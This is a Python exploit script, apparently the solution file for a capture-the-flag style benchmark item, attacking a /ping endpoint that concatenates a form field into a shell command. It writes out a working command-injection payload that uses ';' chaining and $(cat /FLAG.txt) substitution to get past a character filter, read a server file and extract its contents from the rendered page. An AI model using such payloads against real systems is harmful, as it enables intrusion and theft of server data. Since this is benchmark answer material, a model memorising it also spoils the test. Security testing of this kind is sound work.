#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import re
import requests
from urllib.parse import urljoin

"""
X-045-24 exploit (Filtered command injection in /ping)

Vulnerability:
- POST /ping with form field `ip_address` is concatenated into a shell command:
    ping -c 2 <ip_address>
- Only filters: < > | &
- We can use `;` to chain commands and command substitution $(...) to exfiltrate.

Strategy:
- Provide: ip_address = "; echo 1 packets transmitted, $(cat /FLAG.txt) received, 0% packet loss"
- The app parses ping output using regex and renders a summary.
- Our crafted echo line matches the parser and places the flag into the "Packets Received" field.

Usage:
  python3 benchmarks/X-045-24/exp.py [BASE_URL]
Default BASE_URL: http://ip32808
"""

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://ip32808"


def extract_flag(html: str):
    m = re.search(r"FLAG\{[^}]+\}", html)
    if m:
        return m.group(0)
    m = re.search(r"Here is the flag:\s*([^<\r\n]+)", html, re.I)
    if m:
        return m.group(1).strip()
    return None


def main():
    url = urljoin(BASE, "/ping")
    payload = "; echo 1 packets transmitted, $(cat /FLAG.txt) received, 0% packet loss"
    data = {
        # Use urlencoded form submission; requests will encode as needed
        "ip_address": payload,
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X-045-24-EXP)",
        "Content-Type": "application/x-www-form-urlencoded",
    }
    try:
        resp = requests.post(url, headers=headers, data=data, timeout=20)
    except Exception as e:
        print(f"[!] Request failed: {e}")
        sys.exit(2)

    flag = extract_flag(resp.text)
    if flag:
        print(flag)
        sys.exit(0)
    # Fallback: print the page for debugging
    print(resp.text)
    sys.exit(2)


if __name__ == "__main__":
    main()

